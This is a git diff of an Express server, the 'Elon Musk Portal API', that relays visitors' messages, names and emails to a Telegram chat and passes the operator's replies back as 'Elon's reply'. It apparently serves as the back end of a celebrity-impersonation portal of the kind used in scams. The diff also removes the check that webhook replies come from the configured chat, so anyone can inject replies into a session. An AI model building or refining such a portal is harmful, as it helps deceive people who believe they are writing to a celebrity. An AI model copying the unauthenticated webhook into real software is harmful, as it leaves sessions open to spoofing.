@@ -1,27 +1,30 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
+const path = require('path');
 const app = express();
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('public'));
 
-// Your Telegram credentials (Render will override these with env variables)
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
+// Serve static files from public directory
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Your Telegram credentials from environment variables
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 // Store messages for two-way communication
 const userSessions = new Map();
 
-// Health check
-app.get('/', (req, res) => {
+// API Routes
+app.get('/api', (req, res) => {
     res.send('Elon Musk Portal API is running! 🚀');
 });
 
 // Send message to Telegram
 app.post('/api/send-message', async (req, res) => {
-    const { message, userEmail, userName } = req.body;
+    const { message, userName, userEmail } = req.body;
     const sessionId = Date.now().toString();
     
     try {
@@ -39,7 +42,6 @@ app.post('/api/send-message', async (req, res) => {
             parse_mode: 'Markdown'
         });
         
-        // Store session
         userSessions.set(sessionId, {
             timestamp: Date.now(),
             message: message,
@@ -61,33 +63,7 @@ app.post('/api/send-message', async (req, res) => {
     }
 });
 
-// Webhook for Telegram replies
-app.post('/api/webhook', async (req, res) => {
-    const { message } = req.body;
-    
-    if (message && message.reply_to_message && message.from.id.toString() === CHAT_ID) {
-        // This is Elon's reply
-        const originalText = message.reply_to_message.text;
-        const sessionMatch = originalText.match(/🆔 \*Session:\* (\d+)/);
-        
-        if (sessionMatch) {
-            const sessionId = sessionMatch[1];
-            const userSession = userSessions.get(sessionId);
-            
-            if (userSession) {
-                userSession.replied = true;
-                userSession.reply = message.text;
-                userSession.replyTime = Date.now();
-                
-                console.log(`Reply sent to session ${sessionId}: ${message.text}`);
-            }
-        }
-    }
-    
-    res.sendStatus(200);
-});
-
-// Check for replies (polling endpoint for frontend)
+// Check for replies
 app.get('/api/check-reply/:sessionId', (req, res) => {
     const session = userSessions.get(req.params.sessionId);
     
@@ -102,17 +78,35 @@ app.get('/api/check-reply/:sessionId', (req, res) => {
     }
 });
 
-// Get all messages (for admin dashboard)
-app.get('/api/messages', (req, res) => {
-    const messages = Array.from(userSessions.entries()).map(([id, data]) => ({
-        id,
-        ...data
-    }));
-    res.json(messages);
+// Webhook for Telegram replies
+app.post('/api/webhook', async (req, res) => {
+    const { message } = req.body;
+    
+    if (message && message.reply_to_message) {
+        const originalText = message.reply_to_message.text;
+        const sessionMatch = originalText.match(/🆔 \*Session:\* (\d+)/);
+        
+        if (sessionMatch) {
+            const sessionId = sessionMatch[1];
+            const userSession = userSessions.get(sessionId);
+            
+            if (userSession) {
+                userSession.replied = true;
+                userSession.reply = message.text;
+                userSession.replyTime = Date.now();
+            }
+        }
+    }
+    
+    res.sendStatus(200);
+});
+
+// Serve index.html for all other routes (SPA support)
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`🤖 Bot connected: ${BOT_TOKEN.substring(0, 10)}...`);
 });
